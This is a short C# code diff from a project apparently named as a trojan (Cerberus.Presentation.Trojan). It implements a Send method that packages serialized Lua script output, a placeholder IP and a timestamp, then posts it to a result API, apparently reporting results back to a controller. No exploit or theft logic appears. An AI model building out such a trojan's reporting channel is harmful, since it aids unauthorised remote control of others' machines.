@@ -1,4 +1,6 @@
-﻿using Cerberus.Presentation.Trojan.Exceptions;
+﻿using Cerberus.Domain.Models.Script;
+using Cerberus.Domain.Models.Static;
+using Cerberus.Presentation.Trojan.Exceptions;
 using Cerberus.Presentation.Trojan.Interface;
 using Newtonsoft.Json;
 using NLua;
@@ -83,8 +85,15 @@ namespace Cerberus.Presentation.Trojan.Core
 
         public void Send(string serialized) 
         {
-            
-            Program.
+
+            LuaResult _result = new LuaResult();
+            _result.IP = "testIP";
+            _result.Json = serialized;
+            _result.Script = this.Name;
+            _result.Time = DateTime.Now;
+            _result.Type = LuaResultType.STRING;
+
+            _ = Program._luaResultApiService.CreateLuaResult(_result);
 
         }
 
